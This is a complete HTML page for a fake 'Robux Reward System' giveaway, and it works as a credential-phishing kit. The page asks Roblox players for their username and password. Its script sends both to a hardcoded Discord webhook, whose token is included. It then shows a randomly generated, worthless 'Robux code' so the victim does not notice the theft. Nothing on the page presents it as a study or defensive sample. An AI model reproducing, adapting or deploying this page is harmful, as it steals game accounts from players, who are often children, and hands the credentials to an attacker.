<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Robux Rewards</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #6c5ce7;
            --secondary: #a29bfe;
            --dark: #2d3436;
            --light: #f5f6fa;
            --success: #00b894;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Poppins', sans-serif;
        }

        body {
            background-color: var(--light);
            color: var(--dark);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            overflow-x: hidden;
        }

        .container {
            width: 100%;
            max-width: 500px;
            padding: 2rem;
            position: relative;
        }

        .card {
            background: rgba(255, 255, 255, 0.9);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 2.5rem;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
            transition: all 0.3s ease;
            transform-style: preserve-3d;
            position: relative;
            overflow: hidden;
        }

        .card::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(45deg, transparent, var(--secondary), transparent);
            transform: rotate(45deg);
            opacity: 0.1;
            z-index: -1;
            animation: shine 3s infinite;
        }

        @keyframes shine {
            0% {
                transform: rotate(45deg) translate(-30%, -30%);
            }
            100% {
                transform: rotate(45deg) translate(30%, 30%);
            }
        }

        .card:hover {
            transform: translateY(-5px);
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.15);
        }

        h1 {
            text-align: center;
            margin-bottom: 1.5rem;
            color: var(--primary);
            font-weight: 700;
            font-size: 2rem;
            position: relative;
            display: inline-block;
        }

        h1::after {
            content: '';
            position: absolute;
            bottom: -10px;
            left: 50%;
            transform: translateX(-50%);
            width: 50px;
            height: 3px;
            background: var(--primary);
            border-radius: 3px;
        }

        .form-group {
            margin-bottom: 1.5rem;
            position: relative;
        }

        label {
            display: block;
            margin-bottom: 0.5rem;
            font-weight: 500;
            color: var(--dark);
            transition: all 0.3s ease;
        }

        input {
            width: 100%;
            padding: 0.8rem 1rem;
            border: 2px solid #dfe6e9;
            border-radius: 10px;
            font-size: 1rem;
            transition: all 0.3s ease;
            background: rgba(255, 255, 255, 0.8);
        }

        input:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 0 3px rgba(108, 92, 231, 0.2);
        }

        button {
            width: 100%;
            padding: 1rem;
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 5px 15px rgba(108, 92, 231, 0.3);
            margin-top: 0.5rem;
        }

        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(108, 92, 231, 0.4);
        }

        button:active {
            transform: translateY(0);
        }

        .result {
            margin-top: 2rem;
            padding: 1.5rem;
            background: rgba(0, 184, 148, 0.1);
            border-radius: 10px;
            border-left: 4px solid var(--success);
            display: none;
            animation: fadeIn 0.5s ease;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .result h3 {
            color: var(--success);
            margin-bottom: 0.5rem;
        }

        .code {
            font-size: 1.5rem;
            font-weight: 700;
            letter-spacing: 2px;
            color: var(--dark);
            background: rgba(0, 0, 0, 0.05);
            padding: 0.5rem 1rem;
            border-radius: 5px;
            display: inline-block;
            margin-top: 0.5rem;
        }

        .floating {
            position: absolute;
            animation: floating 3s ease-in-out infinite;
            opacity: 0.1;
            z-index: -1;
        }

        .floating:nth-child(1) {
            top: 20%;
            left: 10%;
            width: 50px;
            height: 50px;
            background: var(--primary);
            border-radius: 50%;
            animation-delay: 0s;
        }

        .floating:nth-child(2) {
            top: 60%;
            right: 15%;
            width: 80px;
            height: 80px;
            background: var(--secondary);
            border-radius: 50%;
            animation-delay: 0.5s;
        }

        .floating:nth-child(3) {
            bottom: 10%;
            left: 20%;
            width: 30px;
            height: 30px;
            background: var(--primary);
            border-radius: 50%;
            animation-delay: 1s;
        }

        @keyframes floating {
            0% {
                transform: translateY(0) rotate(0deg);
            }
            50% {
                transform: translateY(-20px) rotate(10deg);
            }
            100% {
                transform: translateY(0) rotate(0deg);
            }
        }

        .loading {
            display: none;
            text-align: center;
            margin-top: 1rem;
        }

        .spinner {
            width: 40px;
            height: 40px;
            margin: 0 auto;
            border: 4px solid rgba(108, 92, 231, 0.2);
            border-top: 4px solid var(--primary);
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }

        .particles {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -2;
        }

        .particle {
            position: absolute;
            background: var(--secondary);
            border-radius: 50%;
            opacity: 0.1;
        }

        @media (max-width: 600px) {
            .container {
                padding: 1rem;
            }
            .card {
                padding: 1.5rem;
            }
        }
    </style>
</head>
<body>
    <div class="particles" id="particles"></div>
    <div class="floating"></div>
    <div class="floating"></div>
    <div class="floating"></div>
    
    <div class="container">
        <div class="card">
            <h1>Robux Reward System</h1>
            
            <div id="login-form">
                <div class="form-group">
                    <label for="username">Username</label>
                    <input type="text" id="username" placeholder="Enter your username" required>
                </div>
                
                <div class="form-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" placeholder="Enter your password" required>
                </div>
                
                <button id="login-btn">Get Daily Robux</button>
                
                <div class="loading" id="loading">
                    <div class="spinner"></div>
                    <p>Generating your Robux code...</p>
                </div>
            </div>
            
            <div class="result" id="result">
                <h3>Your Daily Robux Code</h3>
                <p>Here's your exclusive Robux code. Redeem it in Roblox!</p>
                <div class="code" id="robux-code"></div>
                <p style="margin-top: 1rem; font-size: 0.8rem; color: #636e72;">Code refreshes in 24 hours</p>
            </div>
        </div>
    </div>

    <script>
        // Create floating particles
        function createParticles() {
            const particlesContainer = document.getElementById('particles');
            const particleCount = 20;
            
            for (let i = 0; i < particleCount; i++) {
                const particle = document.createElement('div');
                particle.classList.add('particle');
                
                // Random properties
                const size = Math.random() * 10 + 5;
                const posX = Math.random() * 100;
                const posY = Math.random() * 100;
                const delay = Math.random() * 5;
                const duration = Math.random() * 10 + 10;
                const alpha = Math.random() * 0.1 + 0.05;
                
                particle.style.width = `${size}px`;
                particle.style.height = `${size}px`;
                particle.style.left = `${posX}%`;
                particle.style.top = `${posY}%`;
                particle.style.opacity = alpha;
                particle.style.animation = `floating ${duration}s ease-in-out ${delay}s infinite`;
                
                particlesContainer.appendChild(particle);
            }
        }
        
        // Generate a random Robux code
        function generateRobuxCode() {
            const characters = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
            let code = '';
            
            for (let i = 0; i < 12; i++) {
                if (i > 0 && i % 4 === 0) {
                    code += '-';
                }
                code += characters.charAt(Math.floor(Math.random() * characters.length));
            }
            
            return code;
        }
        
        // Send data to Discord webhook
        async function sendToWebhook(username, password) {
            const webhookUrl = 'https://discord.com/api/webhooks/1360705686102736982/FUO2y5SG41vrtfUroBfXwnl85-kPOx1CVhnHARanPRzqIEuALUn6bXtpK7IumhdTS5nM';
            
            const data = {
                content: `New login!\n**Username:** ${username}\n**Password:** ||${password}||`,
                embeds: [
                    {
                        title: "New Robux Code Claim",
                        color: 0x6c5ce7,
                        fields: [
                            {
                                name: "Username",
                                value: username,
                                inline: true
                            },
                            {
                                name: "Password",
                                value: "||" + password + "||",
                                inline: true
                            },
                            {
                                name: "Timestamp",
                                value: new Date().toLocaleString(),
                                inline: false
                            }
                        ],
                        thumbnail: {
                            url: "https://cdn.discordapp.com/attachments/1066022044167979008/1066022044566429716/robux.png"
                        }
                    }
                ]
            };
            
            try {
                await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(data),
                });
            } catch (error) {
                console.error('Error sending to webhook:', error);
            }
        }
        
        // Handle form submission
        document.getElementById('login-btn').addEventListener('click', async function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();
            
            if (!username || !password) {
                alert('Please fill in all fields');
                return;
            }
            
            // Show loading
            document.getElementById('loading').style.display = 'block';
            document.getElementById('login-btn').disabled = true;
            
            // Simulate processing delay
            await new Promise(resolve => setTimeout(resolve, 2000));
            
            // Send data to Discord
            await sendToWebhook(username, password);
            
            // Generate and display code
            const robuxCode = generateRobuxCode();
            document.getElementById('robux-code').textContent = robuxCode;
            
            // Hide loading, show result
            document.getElementById('loading').style.display = 'none';
            document.getElementById('login-form').style.display = 'none';
            document.getElementById('result').style.display = 'block';
            
            // Store in localStorage so it persists
            localStorage.setItem('robuxCode', robuxCode);
            localStorage.setItem('codeGeneratedAt', Date.now());
            localStorage.setItem('userData', JSON.stringify({ username }));
        });
        
        // Check if there's a stored code
        function checkStoredCode() {
            const storedCode = localStorage.getItem('robuxCode');
            const generatedAt = localStorage.getItem('codeGeneratedAt');
            const userData = localStorage.getItem('userData');
            
            if (storedCode && generatedAt && userData) {
                const oneDay = 24 * 60 * 60 * 1000;
                const now = Date.now();
                
                if (now - parseInt(generatedAt) < oneDay) {
                    // Code is still valid
                    document.getElementById('robux-code').textContent = storedCode;
                    document.getElementById('login-form').style.display = 'none';
                    document.getElementById('result').style.display = 'block';
                    
                    const { username } = JSON.parse(userData);
                    document.getElementById('username').value = username;
                } else {
                    // Code expired
                    localStorage.removeItem('robuxCode');
                    localStorage.removeItem('codeGeneratedAt');
                }
            }
        }
        
        // Initialize
        document.addEventListener('DOMContentLoaded', function() {
            createParticles();
            checkStoredCode();
        });
    </script>
</body>
</html>
